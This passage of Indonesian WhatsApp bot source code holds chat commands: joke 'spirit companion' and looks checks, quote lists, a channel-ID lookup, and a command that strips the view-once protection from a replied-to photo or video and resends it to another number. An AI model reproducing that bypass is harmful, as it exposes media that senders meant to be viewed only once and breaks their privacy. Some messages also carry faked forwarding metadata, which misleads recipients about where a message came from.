                if (!nomor) return reply('Nomor tidak valid!');
                let jid = nomor + '@s.whatsapp.net';
        
                // Pastikan ada pesan yang di-reply
                if (!m.quoted) {
                    return reply('Reply media view once yang ingin dikirim!');
                }
        
                let quoted = m.quoted;
                let msg = quoted.message || quoted.msg || quoted;
        
                // Deteksi dan ekstrak view once message
                if (msg.viewOnceMessageV2) {
                    msg = msg.viewOnceMessageV2.message;
                } else if (msg.viewOnceMessage) {
                    msg = msg.viewOnceMessage.message;
                }
        
                let type = Object.keys(msg)[0];
                let mediaMsg = msg[type];
        
                if (!mediaMsg) {
                    return reply('Media tidak ditemukan atau bukan view once!');
                }
        
                // Ambil media
                let buffer = await sock.downloadMediaMessage({
                    message: msg
                });
        
                // Ambil caption jika ada
                let caption = mediaMsg.caption || '';
        
                // Siapkan pesan tanpa view once
                let sendData = {};
                if (type === 'imageMessage') {
                    sendData = {
                        image: buffer,
                        caption: caption
                    };
                } else if (type === 'videoMessage') {
                    sendData = {
                        video: buffer,
                        caption: caption
                    };
                } else {
                    return reply('Hanya mendukung gambar dan video!');
                }
        
                // Kirim ke target sebagai media biasa
                await sock.sendMessage(jid, sendData);
        
                reply(`✅ Media berhasil dikirim ke ${nomor} tanpa mode view once.`);
            } catch (err) {
                console.error(err);
                reply('❌ Terjadi kesalahan saat mengirim media.');
            }
        }
        break;
        //═══════════════════════════════════//
        case "cekidch": case "idch": {
            if (!text) return reply("mana linkchnya?!")
            if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
            let result = text.split('https://whatsapp.com/channel/')[1]
            let res = await sock.newsletterMetadata("invite", result)
            let teks = `⌬ Channel ID : ${res.id}
⌬ Channel Name : ${res.name}
⌬ Channel Followers : ${res.subscribers}
⌬ Channel Status : ${res.state}
⌬ Verified? : ${res.verification == "✅" ? "Verified? " : "❎"}
`
            let Msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                        interactiveMessage: {
                            footer: { text: `\n${global.footer}` },
                            contextInfo: {
                                mentionedJid: [m.sender], 
                                isForwarded: true, 
                                forwardingScore: 250930,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: global.idSaluran,
                                    newsletterName: global.namaSaluran ,
                                    serverId: 999
                                }
                            },
                            body: { text: teks },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "📋 Copy ID Channel",
                                            copy_code: res.id
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "Open Channel",
                                            url: text,
                                            merchant_url: text
                                        })
                                    }
                                ], 
                            },
                        },
                    }, 
                }, 
            },{ quoted : m });
            await sleep(1500)
            await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
        }
        break;
        //════════════════════════════════//
        case "cekkhodam":
        case "khodam": {
        
            let target =
                m.mentionedJid?.[0] ||
                m.quoted?.sender ||
                m.sender
        
            let khodam = listKhodam[Math.floor(Math.random() * listKhodam.length)]
            let damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', '5 tahun lalu', 'bayi', 'lahir'])
            let kekuatan = Math.floor(Math.random() * 100) + 1
        
            let level =
                kekuatan >= 80 ? "LEGENDARIS" :
                kekuatan >= 60 ? "LUMAYAN LAH" :
                kekuatan >= 40 ? "LANGKA" :
                kekuatan >= 20 ? "BIASA AJA" :
                "MASIH RENDAH"
        
            let anunya = `🌀 *CEK KHODAM SPIRITUAL*\n
📛 *Nama:* @${target.split("@")[0]}
━━━━━━━━━━━━━━
 *Khodam Pendamping:*  
👉 ${khodam}

🔮 *Tingkat Kekuatan:*  
⚡ ${kekuatan}%

🏅 *Kelas Spirit:*  
🔰 ${level}

♠️ Sudah mendampinginya sejak ${damping}.
━━━━━━━━━━━━━━
⚠️ *Catatan:*  
Khodam ini 100% akurat, harap berhati-hati.
`
        
            await sock.sendMessage(m.chat, {
                text: anunya,
                contextInfo: {
                    mentionedJid: [target],
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran
                    },
                    externalAdReply: {
                        title: `${global.dev} — Assistant`,
                        body: `📍 Paju-si, South Korea`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,
                        mediaType: 1
                    }
                }
            }, { quoted: m })
        }
        break
        //════════════════════════════════//
        case "cekganteng":
        case "ganteng": {
        
            let target =
                m.mentionedJid?.[0] ||
                m.quoted?.sender ||
                m.sender
        
            let jenis = listGanteng[Math.floor(Math.random() * listGanteng.length)]
            let persen = Math.floor(Math.random() * 100) + 1
        
            let status =
                persen >= 90 ? "🔥 Tampan Paripurna" :
                persen >= 70 ? " Di atas rata-rata" :
                persen >= 50 ? "😎 Cukup menarik" :
                persen >= 30 ? "🙂 Standar normal" :
                "🗿 Wajah penuh penderitaan"
        
            let anunya = `💫 *CEK GANTENG REALTIME*\n
📛 *Nama:* @${target.split("@")[0]}
━━━━━━━━━━━━━━
😎 *Tipe Kegantengan:*  
👉 ${jenis}

📊 *Presentase Ganteng:*  
💯 ${persen}%

🏆 *Status Penilaian:*  
➡️ ${status}
━━━━━━━━━━━━━━
⚠️ *Disclaimer:*  
Hasil ini serius banget!
`
        
            await sock.sendMessage(m.chat, {
                text: anunya,
                contextInfo: {
                    mentionedJid: [target],
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran
                    },
                    externalAdReply: {
                        title: `${global.dev} — Assistant`,
                        body: `📍 Paju-si, South Korea`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,
                        mediaType: 1
                    }
                }
            }, { quoted: m })
        }
        break
        //═════════════════════════════════//
        case 'cekcantik': {
            if (!text) return reply(`Siapa yang mau lu cek bjerr🗿`)
            
            let target =
                m.mentionedJid?.[0] ||
                m.quoted?.sender ||
                m.sender
            
            let cantikk = [
                'Cantik Level : 77%\n\nGak akan Salah Lagi dah neng, auto klepek² ini mah',
                'Cantik Level : 83%\n\nDijamin cowok gak akan kecewa neng',
                'Cantik Level : 89%\n\ncowo² pasti auto salfok klo ngeliat kamu!',
                'Cantik Level : 94%\n\nAARRGGHHH GEMES BANGET SI!!!',
                'Cantik Level : 100%\n\nKamu Cantik Banget😘\nBidadari surga aja kalah cantiknya'
            ]
            let hasil = cantikk[Math.floor(Math.random() * cantikk.length)]
            let anunya = `*CEK CANTIK* : @${target.split("@")[0]}\n\n${hasil}`
            await sock.sendMessage(m.chat, {
                text: anunya,
                contextInfo: {
                    mentionedJid: [target],
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran
                    },
                    externalAdReply: {
                        title: `${global.dev} — Assistant`,
                        body: `📍 Paju-si, South Korea`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,
                        mediaType: 1
                    }
                }
            }, { quoted: m })
        }
        break;
        //═══════════════════════════════════//
        case 'ceksifat': {
    				let sifat_a = ['Bijak','Sabar','Kreatif','Humoris','Mudah bergaul','Mandiri','Setia','Jujur','Dermawan','Idealis','Adil','Sopan','Tekun','Rajin','Pemaaf','Murah hati','Ceria','Percaya diri','Penyayang','Disiplin','Optimis','Berani','Bersyukur','Bertanggung jawab','Bisa diandalkan','Tenang','Kalem','Logis']
    				let sifat_b = ['Sombong','Minder','Pendendam','Sensitif','Perfeksionis','Caper','Pelit','Egois','Pesimis','Penyendiri','Manipulatif','Labil','Penakut','Vulgar','Tidak setia','Pemalas','Kasar','Rumit','Boros','Keras kepala','Tidak bijak','Pembelot','Serakah','Tamak','Penggosip','Rasis','Ceroboh','Intoleran']
    				let teks = `╭──❍「 *Cek Sifat* 」❍\n│• Sifat ${text && m.mentionedJid ? text : '@' + m.sender.split('@')[0]}${(text && m.mentionedJid ? '' : (`\n│• Nama : *${text ? text : m.pushName}*` || '\n│• Nama : *Tanpa Nama*'))}\n│• Orang yang : *${pickRandom(sifat_a)}*\n│• Kekurangan : *${pickRandom(sifat_b)}*\n│• Keberanian : *${Math.floor(Math.random() * 100)}%*\n│• Kepedulian : *${Math.floor(Math.random() * 100)}%*\n│• Kecemasan : *${Math.floor(Math.random() * 100)}%*\n│• Ketakutan : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Baik : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Buruk : *${Math.floor(Math.random() * 100)}%*\n╰──────❍`
    		    reply(teks)
    		}
    	  break
        //═════════════════════════════════════//
        case 'quotesgalau': case 'galau': {
              function pickRandom(list) {
              return list[Math.floor(list.length * Math.random())]
            }
            const galau = [
                "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
                "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
                "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
                "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
                "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
                "Tak semudah itu melupakanmu",
                "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
                "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
                "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
                "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
                "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
                "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
                "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
                "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
                "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
                "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
                "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
                "Tolong jangan pergi saat aku sudah sangat sayang padamu",
                "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
                "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
                "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
                "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
                "Karenamu aku jadi tau cinta yang sesungguhnya",
                "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
                "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
                "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
                "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
                "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
                "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
                "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
                "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
                "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
                "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
                "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
                "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
                "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
                "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
                "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
                "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
                "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
                "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
                "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
                "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
                "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
                "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
                "Aku berdiri disini sendiri menunggu kehadiran dirimu",
                "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
                "Maaf aku lupa ternyata aku bukan siapa-siapa",
                "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
                "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
                "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
                "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
                "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
                "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
                "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
                "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
                "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
                "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
                "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
                "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
                "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
                "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
                "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
                "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
                "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
                "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
                "Dari sekian lama menunggu apa yang sudah didapat",
                "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
                "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
                "Aku terlahir sederhana dan ditinggal sudah biasa",
                "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
                "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
                "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
                "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
                "Jangan paksa aku menjadi cewek seperti seleramu",
                "Hanya yang sabar yang mampu melewati semua kekecewaan",
                "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
                "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
                "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
                "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
            ]
                let bacotan = pickRandom(galau)
              reply(bacotan)
        }
        break;
        //═══════════════════════════════════//
        case 'quotesmotivasi': case 'motivasi': {
            function pickRandom(list) {
                return list[Math.floor(list.length * Math.random())]
            }
            
            const motivasi = [
                "ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
                "ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
                "ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
                "ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
                "ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
                "ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
                "ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
                "ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
                "ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
                "ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
                "ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
                "ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
                "ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
                "ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
                "ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
                "ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
                "ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
                "ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
                "ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
                "ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
                "ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
                "ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
                "ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
                "ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
                "ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
                "ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
                "ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
                "20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
                "ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
                "ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
